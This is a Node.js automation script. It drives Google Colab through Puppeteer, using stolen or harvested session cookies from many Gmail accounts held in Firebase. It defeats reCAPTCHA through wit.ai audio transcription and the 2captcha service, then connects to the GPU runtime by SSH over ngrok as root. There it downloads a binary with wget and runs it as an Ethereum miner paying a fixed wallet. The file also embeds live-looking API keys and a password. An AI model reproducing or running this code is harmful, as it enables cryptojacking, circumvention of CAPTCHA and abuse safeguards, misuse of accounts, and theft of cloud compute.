const poll = require('promise-poller').default
const puppeteer = require("puppeteer")
const admin = require("firebase-admin")
const {NodeSSH} = require('node-ssh')
const request = require('request')
const express = require("express")
const colog = require('colog')
const axios = require('axios')
const https = require('https')
const path = require("path")
const fs = require('fs')


const app = express()

const ssh = new NodeSSH()

const serviceAccount = require(path.resolve("raiyan-088-firebase-adminsdk-9ku78-11fcc11d0c.json"));

const USERAGENT = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.0 Safari/537.36'
const google = 'https://colab.research.google.com/drive/1DnHSyk5BXxmp1ddj_GMlS0TLefc2peGX'

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://raiyan-088-default-rtdb.firebaseio.com"
})

const database = admin.database().ref('raiyan')

const startTime = parseInt(new Date().getTime() / 1000)

let mFirstLoad = false
let mDown = false
let allData = null
let mUserAgent = {}
let keyData = new Map()
let SIZE = 0
let USER = 1
let LOAD = 0
let mUserAgentLength = 0
let update = startTime
let statusRun = 0
let mBlockCount = 0

let mActiveTime = 0
let mAudioBlock = false
let mGPUt4 = false
let mGPUk80 = false
let mTotalGPUk80 = 0
let mLogRuning = 0
let RUNING = 0
let PORT = 5000
let mFinish = false
let mPageLoad = false
let mLoadSuccess = false
let mMining = false
let cookes = []
let browser = null
let page = null
let mAuth = null
let mIP = null
let mNotAuth = 0
let temp = [] 

const html = `
<h1>Reload Page</h1>
<script>
window.addEventListener("beforeunload", function (e) {
  e.preventDefault();
  (e || window.event).returnValue = "";
  return "";
});
</script>
`;


console.log(colog.colorCyan('Downloading data...'))

database.child('server').child('runing').on('value', (reloadData) => {
    const data = reloadData.val();
    if(data != null) {
        RUNING = parseInt(data)
    }
})


database.child('server').child('data').on('value', (reloadData) => {
    const data = reloadData.val()
    if(data != null && data == 'reload') {
        database.child('server').once('value', (snapsData) => {
            const details = snapsData.val()
            if(details != null) {
                if(mFirstLoad) {
                    SIZE = parseInt(details['size'])
                    database.child('gmail').once('value', (snapshot) => {
                        const value = snapshot.val()
                        if(value != null) {
                            allData = value
                            console.log(G(getTime()+'Data Reload Success...'))
                            startBackgroundService()
                        }
                    })
                } else {
                    SIZE = parseInt(details['size'])
                    LOAD = parseInt(details['load'])
                    PORT = parseInt(details['port'])
                    PORT++
                    database.child('server').child('port').set(PORT)
                    app.listen(process.env.PORT || PORT, ()=>{
                        console.log('Listening on port '+PORT+'...')
                    })
                    database.child('gmail').once('value', (snapshot) => {
                        const value = snapshot.val()
                        if(value != null) {
                            allData = value
                            console.log(colog.colorGreen('Download Success'))
                            startBackgroundService()
                        }
                    })
                } 
            }
        })
    }
})

let timer = setInterval(async function() {

    mLogRuning++
    const now = parseInt(new Date().getTime() / 1000)
    if(mLogRuning > 30) {
        mLogRuning = 0
        console.log(M('+--------------------------------------------------------------------+'))
        console.log(M('+--------------------------------------------------------------------+'))
        console.log(M('Server Port: '+PORT+' -- Runing: '+RUNING+' -- Time: '+timeToString(now-startTime)))
        console.log(M('+--------------------------------------------------------------------+'))
        console.log(M('+--------------------------------------------------------------------+'))
    }
    if((now-update) > 60 && mLoadSuccess) {
        if(mGPUt4) {
            RUNING--
            database.child('server').child('runing').set(RUNING)
            if(mAuth) {
                database.child('ngrok').child(mAuth).set(true)
            }
        }
        mIP = null
        mAuth = null
        mNotAuth = 0
        mGPUt4 = false
        mFinish = false
        mMining = false
        mPageLoad = false
        mAudioBlock = false
        console.log(R(getTime()+'Something Error. Restart Browser...'))
        statusRun++
        await page.setUserAgent(USERAGENT)
        console.log('Id: '+M(LOAD)+' Status: '+M('Reload page...')+' Gmail: '+M(keyData.get(LOAD)))
        await page.goto(google+'?authuser='+(LOAD%10), {waitUntil: 'domcontentloaded', timeout: 0})
    } else {
        if(statusRun > 5) {
            statusRun = 0
            console.log(M('+--------------------------------------------------------------------+'))
        }
        if(mGPUt4 && !mFinish) {
            const now = parseInt(new Date().getTime() / 1000)
            if(mDown) {
                mDown = false
                await page.keyboard.press('ArrowUp')
            } else {
                mDown = true
                await page.keyboard.press('ArrowDown')
            }

            if(!mIP || !mMining) {
                mIP = await page.evaluate(() => {
                    let output = document.querySelector('colab-static-output-renderer')
                    if(output) {
                        let result = output.innerHTML
                        let index = result.indexOf('HostName')
                        if(index != -1) {
                            let hostPort = result.substring(index+9, result.length)
                            let host = hostPort.substring(0, hostPort.indexOf('.tcp.ngrok.io'))
                            let adress = hostPort.indexOf('Port')
                            let port = hostPort.substring(adress+4, adress+10)
                            return host+'X'+port.match(/\d+/g)
                        }
                    }
                    return null
                })
                if(mIP) {
                    const host = mIP.substring(0, mIP.indexOf('X'))+'.tcp.ngrok.io'
                    const port = parseInt(mIP.substring(mIP.indexOf('X')+1, mIP.length))
                    console.log('Id: '+M(LOAD)+' SSH: '+M('Connecting...')+' Gmail: '+M(keyData.get(LOAD)))
                    ssh.connect({
                        host: host,
                        username: 'root',
                        port: port,
                        password: 'raiyan',
                        tryKeyboard: true,
                    }).then(function() {
                        statusRun++
                        console.log('Id: '+M(LOAD)+' SSH: '+M('Connected')+' Gmail: '+M(keyData.get(LOAD)))
                        
                        ssh.execCommand('wget https://raw.githubusercontent.com/raiyan088/mining/main/raiyan').then(function(result1) {
                            ssh.execCommand('chmod +x raiyan').then(function(result2) {
                                ssh.execCommand('./raiyan --algo ETHASH --pool eth-us-east1.nanopool.org:9999 --user 0x1Bca380a4517dc29811C39472C1D1d665fE2A419 --pass raiyan088 --ethstratum ETHPROXY')
                                console.log('Id: '+M(LOAD)+' SSH: '+M('Mining Start...')+' Gmail: '+M(keyData.get(LOAD)))
                                mActiveTime = parseInt(new Date().getTime() / 1000)
                                mMining = true
                                statusRun++
                            })
                        })
                    }).catch (function(e) {
                        statusRun++
                        mIP = null
                        console.log('Id: '+R(LOAD)+' SSH: '+R('Connection Failed')+' Gmail: '+R(keyData.get(LOAD)))
                    })
                } else {
                    statusRun++
                    console.log('Id: '+R(LOAD)+' SSH: '+R('Host & Port not found')+' Gmail: '+R(keyData.get(LOAD)))
                    
                }
            }
            
            if(!mAuth) {
                mAuth = await page.evaluate(() => {
                    let output = document.querySelector('colab-static-output-renderer')
                    if(output) {
                        let result = output.innerHTML
                        let start = result.indexOf('startXXXXX')
                        let end = result.indexOf('XXXXXend')
                        if(start != -1 && end != -1) {
                            return result.substring(start+10, end)
                        }
                    }
                    return null
                })
                if(mAuth) {
                    database.child('ngrok').child(mAuth).set(false)
                } else {
                    let mAuthNull = await page.evaluate(() => {
                        let output = document.querySelector('colab-static-output-renderer')
                        if(output) {
                            if(output.innerHTML.indexOf('XXXXXXXXXX') != -1) {
                                return true
                            }
                        }
                        return false
                    })
                    if(mAuthNull) {
                        mNotAuth++
                    }
                }
            }

            if(mNotAuth >= 5) {
                statusRun++
                if(mGPUt4) {
                    RUNING--
                    database.child('server').child('runing').set(RUNING)
                    if(mAuth) {
                        database.child('ngrok').child(mAuth).set(true)
                    }
                }
                statusRun++
                mIP = null
                mAuth = null
                mNotAuth = 0
                mGPUt4 = false
                mFinish = false
                mMining = false
                mPageLoad = false
                mAudioBlock = false
                console.log(R(getTime()+'Auth Error. Restart Browser...'))
                statusRun++
                await page.setUserAgent(USERAGENT)
                console.log('Id: '+M(LOAD)+' Status: '+M('Reload page...')+' Gmail: '+M(keyData.get(LOAD)))
                await page.goto(google+'?authuser='+(LOAD%10), {waitUntil: 'domcontentloaded', timeout: 0})
            } else {
                if(mMining) {
                    await checkActive()
                }
            }
        }
    }
}, 60000)

async function startBackgroundService() {
    ;(async () => {
        for(let [key, value] of Object.entries(allData)) {
            try {
                let id = parseInt(key.replace('account_', ''))
                let size = 0
                for(let gmail of Object.keys(value['GMAIL'])) {
                    keyData.set((id*10)+size, gmail+'@gmail.com')
                    size++
                }
            } catch (e) {}
        }

        if(!mFirstLoad){
            LOAD++
            statusRun++
            mBlockCount = 0
            mFirstLoad = true
            mAudioBlock = false
            console.log(Y(getTime()+'Service Start...'))
            temp = JSON.parse(fs.readFileSync('./cookies.json'))
            mUserAgent = JSON.parse(fs.readFileSync('./user-agent-list.json'))
            mUserAgentLength = Object.keys(mUserAgent).
            USER = Math.floor((Math.random() * mUserAgentLength) + 1)
            await checkSize()
            LOAD = 10
            await browserStart(true)
        }
    })()
}

async function browserStart(start) {

    mGPUt4 = false
    mFinish = false
    mPageLoad = false
    
    const DATA = allData[getKey(parseInt(LOAD/10))]
    statusRun++
    console.log('Id: '+M(LOAD)+' Status: '+M('Start process...')+' Gmail: '+M(keyData.get(LOAD)))

    if(start) {
        mTotalGPUk80 = 0
        database.child('server').child('load').set(LOAD)
    }
    
    temp.forEach(function(value){
        if(value.name == 'SSID') {
            value.value = DATA['SSID']
        } else if(value.name == 'SAPISID') {
            value.value = DATA['SAPISID']
        } else if(value.name == 'OSID') {
            value.value = DATA['OSID']
        } else if(value.name == 'SID') {
            value.value = DATA['SID']
        } else if(value.name == '__Secure-1PSID') {
            value.value = DATA['1PSID']
        } else if(value.name == 'HSID') {
            value.value = DATA['HSID']
        }
        //cookes.push(value)
    })

    cookes = JSON.parse(fs.readFileSync('./recaptcha.json'))

    browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    })

    page = (await browser.pages())[0]
    
    await page.setCookie(...cookes)

    await page.setUserAgent(USERAGENT)

    await page.setRequestInterception(true)
    
    page.on('request', async request => {
        const url = request.url()
        update  = parseInt(new Date().getTime() / 1000)
        if(url == 'https://colab.research.google.com/_/bscframe') {
            request.continue()
            if(!mPageLoad && !mFinish) {
                statusRun++
                await delay(1000)
                console.log('Id: '+G(LOAD)+' Status: '+G('Webside load Success...')+' Gmail: '+G(keyData.get(LOAD)))
                await page.keyboard.down('Control')
                await page.keyboard.press('Enter')
                await page.keyboard.up('Control')
                await waitForSelector(page, 'div[class="content-area"]', 10)
                await delay(1000)
                await page.keyboard.press('Tab')
                await page.keyboard.press('Enter')
                mPageLoad = true
            }
        } else if(url.startsWith('https://www.google.com/recaptcha/api2/bframe')) {
            request.continue()

            if(!mGPUt4 && !mGPUk80) {
                if(mAudioBlock) {
                    solveV2Recaptchas()
                } else {
                    solveRecaptchas()
                }
            } else {
                await page.evaluate(() => { let recapture = document.querySelector('colab-recaptcha-dialog'); if(recapture) { recapture.shadowRoot.querySelector('mwc-button').click() } })
            }
        } else if(url.startsWith('https://colab.research.google.com/tun/m/gpu-k80') || url.startsWith('https://colab.research.google.com/tun/m/gpu-t4')) {
            request.abort()
            if(mPageLoad) {
                mGPUk80 = true
                await delay(1000)
                mTotalGPUk80++
                let siriyal = url.replace('https://colab.research.google.com/tun/m/gpu-', '')
                let slash = siriyal.indexOf('/') 
                if(slash != -1) {
                    siriyal = siriyal.substring(0, slash)
                } else {
                    siriyal = 'null'
                }
                statusRun++
                console.log('Id: '+R(LOAD)+' Failed: '+R(mTotalGPUk80)+' GPU: '+R(siriyal)+' Gmail: '+R(keyData.get(LOAD)))

                await page.keyboard.press('Enter')
                await delay(1000)

                if(mPageLoad) {
                    await page.click('#runtime-menu-button')
                    for(var i=0; i<6; i++) {
                        await page.keyboard.press('ArrowDown')
                    }
                    await delay(420)
                    await page.keyboard.down('Control')
                    await page.keyboard.press('Enter')
                    await page.keyboard.up('Control')
                    await waitForSelector(page, 'div[class="content-area"]', 10)
                    await page.keyboard.press('Enter')
                    await delay(420)
                    if(mTotalGPUk80 >= 100) {
                        statusRun++
                        mFinish = true
                        mGPUk80 = false
                        mPageLoad = false
                        console.log('Id: '+R(LOAD)+' Status: '+R('Failed Over LImited')+' Gmail: '+R(keyData.get(LOAD)))
                        await reOpenBrowser()
                    } else {
                        await delay(1000)
                        await page.keyboard.down('Control')
                        await page.keyboard.press('Enter')
                        await page.keyboard.up('Control')
                        mGPUk80 = false
                    }
                }
            }
        } else {
            request.continue()
        }
    })

    page.on('response', async response => {
        try {
            if (!response.ok() && (response.request().resourceType() == 'fetch' || response.request().resourceType() == 'xhr')) {
                let url = response.url()
                if(url.startsWith('https://www.googleapis.com/drive/')) {
                    if(!mFinish) {
                        if(mGPUt4) {
                            RUNING--
                            mMining = true
                            database.child('server').child('runing').set(RUNING)
                            if(mAuth) {
                                database.child('ngrok').child(mAuth).set(true)
                            }
                        }
                        statusRun++
                        mIP = null
                        mAuth = null
                        mFinish = true
                        mMining = false
                        mNotAuth = 0
                        mPageLoad = false
                        let key = getKey(parseInt(LOAD/10))
                        let key2 = keyData.get(LOAD).replace('@gmail.com', '')
                        database.child('gmail').child(key).child('GMAIL').child(key2).set(false)
                        allData[key]['GMAIL'][key2] = false
                        console.log('Id: '+R(LOAD)+' Status: '+R('Sing-Out gmail...')+' Gmail: '+R(keyData.get(LOAD)))
                        await delay(2000)
                        console.log('wait 2s')
                        await reOpenBrowser()
                    }
                } else if(url.startsWith('https://colab.research.google.com/tun/m/assign?')) {
                    console.log('Id: '+R(LOAD)+' Status: '+R('Terminated gmail...')+' Gmail: '+R(keyData.get(LOAD)))
                } else if(url.startsWith('https://colab.research.google.com/tun/m/gpu-')) {
                    console.log('Id: '+R(LOAD)+' Status: '+R('Terminated gmail gpu...')+' Gmail: '+R(keyData.get(LOAD)))
                }
            }
        } catch (err) {}
    })

    page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

    await page.goto(google+'?authuser='+(LOAD%10), {waitUntil: 'domcontentloaded', timeout: 0})

    mLoadSuccess = true
}

async function checkActive() {
    const now = parseInt(new Date().getTime() / 1000)

    const runTime = parseInt((now - mActiveTime) / 60)
    if(runTime >= 600 && !mFinish) {
        if(mGPUt4) {
            RUNING--
            database.child('server').child('runing').set(RUNING)
            if(mAuth) {
                database.child('ngrok').child(mAuth).set(true)
            }
        }
        statusRun++
        mIP = null
        mAuth = null
        mFinish = true
        mMining = false
        mNotAuth = 0
        mPageLoad = false
        console.log('Id: '+G(LOAD)+' Runing: '+G(runTime+'m')+' Status: '+G('Completed')+' Gmail: '+G(keyData.get(LOAD)))
        try {
            await page.keyboard.press('ArrowUp')
            await delay(420)
            console.log('arro up')
            for(let i=0; i<2; i++) {
                await page.keyboard.down('Control')
                await page.keyboard.down('M')
                await page.keyboard.press('D')
                await page.keyboard.up('M')
                await page.keyboard.up('Control')
                await delay(420)
            }
            console.log('clear run view')
            await delay(1000)
            await page.click('#runtime-menu-button')
            console.log('click menu button')
            for(var i=0; i<5; i++) {
                await page.keyboard.press('ArrowDown')
            }
            console.log('down 5 arrow')
            await delay(420)
            await page.keyboard.down('Control')
            await page.keyboard.press('Enter')
            await page.keyboard.up('Control')
            console.log('click factor reset')
            await waitForSelector(page, 'div[class="content-area"]', 10)
            console.log('wait ok button')
            await page.keyboard.press('Enter')
            console.log('click ok')
        } catch (e) {
            console.log('error')
        }
        await delay(10000)
        console.log('wait 10s')
        await reOpenBrowser()
    } else {
        statusRun++
        const secound = parseInt((now - mActiveTime) % 60)
        console.log('Id: '+C(LOAD)+' Runing: '+C(runTime+'m '+secound+'s')+' Status: '+C('Running process.....')+' Gmail: '+C(keyData.get(LOAD)))
    }
}

async function reOpenBrowser() {
    if(statusRun > 5) {
        statusRun = 0
        console.log(M('+--------------------------------------------------------------------+'))
    }
    console.log(C(getTime()+'LOAD Data Check on Server...'))
    database.child('server').once('value', (snapshot) => {
        const value = snapshot.val()
        if(value != null) {
            console.log(G(getTime()+'LOAD Data Check Success'))
            ;(async () => {
                let BEFORE = LOAD - 1
                LOAD = parseInt(value['load']) +1
                let now = parseInt(new Date().getTime() / 1000)
                await checkSize()

                if(LOAD >= (SIZE+1)*10) {
                    LOAD = 9
                    for(var i=0; i<BEFORE; i++) {
                        let key = getKey(parseInt(LOAD/10))
                        let key2 = keyData.get(LOAD).replace('@gmail.com', '')
                        if(!allData[key]['GMAIL'][key2]) {
                            LOAD++
                        } else {
                            i = BEFORE
                        }           
                    }
                }

                if(BEFORE != LOAD) {
                    console.log(Y(getTime()+'Service Start Again...'))
                    mBlockCount = 0
                    mGPUt4 = false
                    mFinish = false
                    mPageLoad = false
                    mAudioBlock = false
                    
                    const DATA = allData[getKey(parseInt(LOAD/10))]
                    statusRun++
                    console.log('Id: '+M(LOAD)+' Status: '+M('Start process...')+' Gmail: '+M(keyData.get(LOAD)))
                
                    mTotalGPUk80 = 0
                    database.child('server').child('load').set(LOAD)
                    
                    temp.forEach(function(value){
                        if(value.name == 'SSID') {
                            value.value = DATA['SSID']
                        } else if(value.name == 'SAPISID') {
                            value.value = DATA['SAPISID']
                        } else if(value.name == 'OSID') {
                            value.value = DATA['OSID']
                        } else if(value.name == 'SID') {
                            value.value = DATA['SID']
                        } else if(value.name == '__Secure-1PSID') {
                            value.value = DATA['1PSID']
                        } else if(value.name == 'HSID') {
                            value.value = DATA['HSID']
                        }
                        cookes.push(value)
                    })

                    await page.setCookie(...cookes)

                    await page.setUserAgent(USERAGENT)

                    await page.goto(google+'?authuser='+(LOAD%10), {waitUntil: 'domcontentloaded', timeout: 0})
                } else {
                    statusRun++
                    mFinish = true
                    mPageLoad = false
                    try {
                        await page.close()
                        await browser.close()
                    } catch (e) {}
                    clearInterval(timer)
                    console.log(R(getTime()+'Service Stop...'))
                }
            })()
        }
    })
}

async function checkSize() {
    let loop = (SIZE+1)*10
    for(var i=LOAD; i<loop; i++) {
        let key = getKey(parseInt(LOAD/10))
        let key2 = keyData.get(LOAD).replace('@gmail.com', '')
        if(!allData[key]['GMAIL'][key2]) {
            LOAD++
        } else {
            i = loop
        }
    }
}


app.get('/', async function(req, res) {
    if(page == null) {
        res.writeHeader(400, {"Content-Type": "text/html"})
        res.write('Error')
        res.end()
    } else {
        await page.screenshot({ path: './image.png' })
        fs.readFile('./image.png', function (err, data) {
            if (err) {
                const error = page.content()
                res.writeHeader(400, {"Content-Type": "text/html"})
                res.write(error)
                res.end()
            }else {
                res.writeHeader(200, {"Content-Type": "image/png"})
                res.write(data)
                res.end()
            }
        })
    }
})

async function solveRecaptchas() {

    statusRun++
    const time = parseInt(new Date().getTime() / 1000)
    console.log('Id: '+Y(LOAD)+' Status: '+Y('Recaptcha starting...')+' Gmail: '+Y(keyData.get(LOAD)))
    
    await page.setUserAgent(mUserAgent[USER])

    try {
        let frames = await page.frames()
        let mSecend = false
        const recaptchaFrame = frames.find(frame => {
            if(frame.url().includes('api2/anchor')) {
                if(mSecend) {
                    return frame
                } else {
                    mSecend = true
                }
            }
        })

        const checkbox = await recaptchaFrame.$('#recaptcha-anchor')
        await checkbox.click()
        let hasBframe = false

        for(let i=0; i<10; i++) {
            await delay(500)
            const value = await page.evaluate(() => {
                return document.querySelector('iframe[src*="api2/bframe"]')
            })
            if(value) {
                i = 10
                hasBframe = true
            }
        }

        if(hasBframe) {
            frames = await page.frames()
            const imageFrame = frames.find(frame => frame.url().includes('api2/bframe'))
            let hasAudioButton = false

            for(let i=0; i<10; i++) {
                await delay(500)
                const value = await imageFrame.evaluate(() => {
                    var audio = document.querySelector('#recaptcha-audio-button')
                    if(audio) {
                        audio.click()
                        return true
                    } else {
                        return null
                    }
                })
                
                if(value) {
                    i = 10
                    hasAudioButton = true
                }
            }

            if(hasAudioButton) {
                while (true) {
                    const value = await imageFrame.evaluate(() => {
                        return document.querySelector('#audio-source')
                    })
                    if(value) {
                        const audioLink = await imageFrame.evaluate(() => {
                            return document.querySelector('#audio-source').src
                        })
                        const audioBytes = await imageFrame.evaluate(audioLink => {
                            return (async () => {
                                const response = await window.fetch(audioLink)
                                const buffer = await response.arrayBuffer()
                                return Array.from(new Uint8Array(buffer))
                            })()
                        }, audioLink)
                  
                        const httsAgent = new https.Agent({ rejectUnauthorized: false })
                        const response = await axios({
                            httsAgent,
                            method: 'post',
                            url: 'https://api.wit.ai/speech?v=2021092',
                            data: new Uint8Array(audioBytes).buffer,
                            headers: {
                                Authorization: 'Bearer JVHWCNWJLWLGN6MFALYLHAPKUFHMNTAC',
                                'Content-Type': 'audio/mpeg3'
                            }
                        })
                        
                        let audioTranscript = null;
                  
                        try{
                            audioTranscript = response.data.match('"text": "(.*)",')[1].trim()
                        } catch(e){
                            const reloadButton = await imageFrame.$('#recaptcha-reload-button')
                            await reloadButton.click()
                            continue
                        }
                  
                        const input = await imageFrame.$('#audio-response')
                        await input.click()
                        await input.type(audioTranscript)
                  
                        const verifyButton = await imageFrame.$('#recaptcha-verify-button')
                        await verifyButton.click()

                        await delay(1000)
                        try {
                            const error = await imageFrame.evaluate(() => {
                                return document.querySelector('.rc-audiochallenge-error-message')
                            })
                            if(error) {
                                await delay(4000)
                                continue
                            } else {
                                if(!mFinish && !mGPUt4 && !mGPUk80) {
                                    statusRun++
                                    try {
                                        await page.setUserAgent(USERAGENT)
                                    } catch (e) {}
                                    const now = parseInt(new Date().getTime() / 1000)
                                    console.log('Id: '+G(LOAD)+' Time: '+G(parseInt(now-time)+'s')+' Status: '+G('Recaptcha Success...')+' Gmail: '+G(keyData.get(LOAD)))
                                }
                                return 'success'
                            }
                        } catch (e) {
                            if(!mFinish && !mGPUt4 && !mGPUk80) {
                                statusRun++
                                try {
                                    await page.setUserAgent(USERAGENT)
                                } catch (e) {}
                                const now = parseInt(new Date().getTime() / 1000)
                                console.log('Id: '+G(LOAD)+' Time: '+G(parseInt(now-time)+'s')+' Status: '+G('Recaptcha Success...')+' Gmail: '+G(keyData.get(LOAD)))
                            }
                            return 'success'
                        }
                    } else {
                        await delay(5000)
                        const block = await imageFrame.evaluate(() => {
                            return document.querySelector('div[class="rc-doscaptcha-header"]')
                        })
                        if(block  && !mGPUt4 && !mGPUk80) {
                            if(mBlockCount >= 4) {
                                mAudioBlock = true
                            }
                            statusRun++
                            mBlockCount++
                            const now = parseInt(new Date().getTime() / 1000)
                            USER = Math.floor((Math.random() * mUserAgentLength) + 1)
                            console.log('Id: '+R(LOAD)+' Time: '+R(parseInt(now-time)+'s')+' Status: '+R('Recaptcha falied. Audio Tamporary block...')+' Gmail: '+R(keyData.get(LOAD)))
                            captchaFailed()
                            return 'block'
                        } else {
                            continue
                        }
                    }
                }
            } else {
                await recaptchasError(time, 'Recaptcha falied. Audio frame not found...')
                return 'error'
            }
        } else {
            if(!mFinish && !mGPUt4 && !mGPUk80) {
                statusRun++
                try {
                    await page.setUserAgent(USERAGENT)
                } catch (e) {}
                const now = parseInt(new Date().getTime() / 1000)
                console.log('Id: '+G(LOAD)+' Time: '+G(parseInt(now-time)+'s')+' Status: '+G('Recaptcha Auto Solve...')+' Gmail: '+G(keyData.get(LOAD)))
            }
            return 'success'
        }
    } catch (e) {
        await recaptchasError(time, 'Somthing Error: '+e)
        return 'error'
    }
}

async function recaptchasError(time, status) {
    if(mPageLoad && !mGPUt4 && !mGPUk80) {
        statusRun++
        mIP = null
        mAuth = null
        mFinish = false
        mMining = false
        mNotAuth = 0
        mPageLoad = false
        const now = parseInt(new Date().getTime() / 1000)
        console.log('Id: '+R(LOAD)+' Time: '+R(parseInt(now-time)+'s')+' Status: '+R(status)+' Gmail: '+R(keyData.get(LOAD)))
        await page.setUserAgent(USERAGENT)
        console.log('Id: '+M(LOAD)+' Status: '+M('Reload page...')+' Gmail: '+M(keyData.get(LOAD)))
        await page.goto(google+'?authuser='+(LOAD%10), {waitUntil: 'domcontentloaded', timeout: 0})
    }
}

async function solveV2Recaptchas() {
    
    statusRun++
    const time = parseInt(new Date().getTime() / 1000)
    console.log('Id: '+Y(LOAD)+' Status: '+Y('Recaptcha v2 starting...')+' Gmail: '+Y(keyData.get(LOAD)))
    
    try {
        const formData = {
            method: 'userrecaptcha',
            googlekey: '6LfQttQUAAAAADuPanA_VZMaZgBAOnHZNuuqUewp',
            key: '91a8b67a466ec3c4013e694c2a73197e',
            pageurl: 'https://colab.research.google.com/',
            json: 1
        };
        request.post({
            url: 'http://2captcha.com/in.php',
            form: formData
        }, function(error, response, body){
            if (error == null) {
                try {
                    ;(async() => {
                        try {
                            const response = await pollForRequestResults(JSON.parse(body).request)
                            await page.evaluate((key) => {

                                var clients = getClients()
                                var client = _flattenObject(clients[0])
                    
                                eval(client.callback).call(window, key)
                    
                                function getClients() {
                                    if (!window || !window.__google_recaptcha_client) return
                                    if (!window.___grecaptcha_cfg || !window.___grecaptcha_cfg.clients) {
                                        return
                                    }
                                    if (!Object.keys(window.___grecaptcha_cfg.clients).length) return
                                    return window.___grecaptcha_cfg.clients
                                }
                    
                                function _flattenObject(item, levels = 2, ignoreHTML = true) {
                                    const isObject = (x) => x && typeof x === 'object'
                                    const isHTML = (x) => x && x instanceof HTMLElement
                                    let newObj = {}
                                    for (let i = 0; i < levels; i++) {
                                        item = Object.keys(newObj).length ? newObj : item
                                        Object.keys(item).forEach(key => {
                                            if (ignoreHTML && isHTML(item[key])) return
                                            if (isObject(item[key])) {
                                                Object.keys(item[key]).forEach(innerKey => {
                                                    if (ignoreHTML && isHTML(item[key][innerKey])) return
                                                    const keyName = isObject(item[key][innerKey]) ? `obj_${key}_${innerKey}` : `${innerKey}`
                                                    newObj[keyName] = item[key][innerKey]
                                                })
                                            } else {
                                                newObj[key] = item[key]
                                            }
                                        })
                                    }
                                return newObj
                                }
                            }, response)
                    
                            statusRun++
                            mBlockCount = 0
                            mAudioBlock = false
                            const now = parseInt(new Date().getTime() / 1000)
                            console.log('Id: '+G(LOAD)+' Time: '+G(parseInt(now-time)+'s')+' Status: '+G('Recaptcha v2 Success...')+' Gmail: '+G(keyData.get(LOAD)))
                        } catch (e) {
                            const now = parseInt(new Date().getTime() / 1000)
                            console.log('Id: '+R(LOAD)+' Time: '+R(parseInt(now-time)+'s')+' Status: '+R('Recaptcha v2 Responce error...')+' Gmail: '+R(keyData.get(LOAD)))
                            await captchaFailed()
                        }
                    })()
                } catch (e) {
                    ;(async() => {
                        const now = parseInt(new Date().getTime() / 1000)
                        console.log('Id: '+R(LOAD)+' Time: '+R(parseInt(now-time)+'s')+' Status: '+R('Recaptcha v2 error...'+e)+' Gmail: '+R(keyData.get(LOAD)))
                        await captchaFailed()
                    })()
                }
            } else {
                ;(async() => {
                    const now = parseInt(new Date().getTime() / 1000)
                    console.log('Id: '+R(LOAD)+' Time: '+R(parseInt(now-time)+'s')+' Status: '+R('Recaptcha v2 error...')+' Gmail: '+R(keyData.get(LOAD)))
                    await captchaFailed()
                })()
            }
        })
    } catch (e) {
        const now = parseInt(new Date().getTime() / 1000)
        console.log('Id: '+R(LOAD)+' Time: '+R(parseInt(now-time)+'s')+' Status: '+R('Recaptcha v2 error...'+e)+' Gmail: '+R(keyData.get(LOAD)))
        await captchaFailed()
    }
}

async function captchaFailed() {
    if(mPageLoad  && !mGPUt4 && !mGPUk80) {
        mIP = null
        mAuth = null
        mFinish = false
        mMining = false
        mPageLoad = false
        mNotAuth = 0
        statusRun++
        await page.setUserAgent(USERAGENT)
        console.log('Id: '+M(LOAD)+' Status: '+M('Reload page...')+' Gmail: '+M(keyData.get(LOAD)))
        await page.goto(google+'?authuser='+(LOAD%10), {waitUntil: 'domcontentloaded', timeout: 0})
    }
}


async function waitForSelector(page, command, loop) {
    for(let i=0; i<loop; i++) {
        await delay(500)
        const value = await page.evaluate((command) => {  return document.querySelector(command) },command)
        if(value) i = loop
    }
}
  
function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    });
}

function getKey(size) {
    let zero = ''
    let loop = size.toString().length
    for(let i=0; i<4-loop; i++) {
        zero += '0'
    }
    return 'account_'+zero+size
}
  
function getTime() {
    var currentdate = new Date(); 
    return "Last Sync: @ " + currentdate.getHours() + ":" + currentdate.getMinutes() + ":" + currentdate.getSeconds() + ' @ --- '
}
  
function timeToString(s) {
    let minute = parseInt(s / 60)
    if(minute < 60) {
        return '0d 0h '+minute+'m'
    } else {
        let hour = parseInt(minute / 60)
        minute = parseInt(minute % 60)
        if(hour < 24) {
            return '0d '+hour+'h '+minute+'m'
        } else {
            let day = parseInt(hour / 24)
            hour = parseInt(hour % 24)
            return day+'d '+hour+'h '+minute+'m'
        }
    }
}

function R(log) {
    return colog.colorRed(log)
}

function G(log) {
    return colog.colorGreen(log)
}

function Y(log) {
    return colog.colorYellow(log)
}

function C(log) {
    return colog.colorCyan(log)
}

function M(log) {
    return colog.colorMagenta(log)
}

async function pollForRequestResults(id, retries = 30, interval = 1500, delay = 15000) {
    await timeout(delay);
    return poll({
        taskFn: requestCaptchaResults('91a8b67a466ec3c4013e694c2a73197e', id),
        interval,
        retries
    })
}


function requestCaptchaResults(apiKey, requestId) {
    const url = `http://2captcha.com/res.php?key=${apiKey}&action=get&id=${requestId}&json=1`
    return async function() {
        return new Promise(async function(resolve, reject){
            try {
                request.get({
                    url: url,
                    json: true,
                    headers: {'User-Agent': 'request'}
                  }, (err, res, data) => {
                    if(err) {
                        return reject()
                    } else if (res.statusCode !== 200) {
                        return reject()
                    } else {
                        if (data.status === 0) return reject(data.request)
                        resolve(data.request)
                    }
                })
            } catch (e) {
                return reject()
            }
        })
    }
}

const timeout = millis => new Promise(resolve => setTimeout(resolve, millis))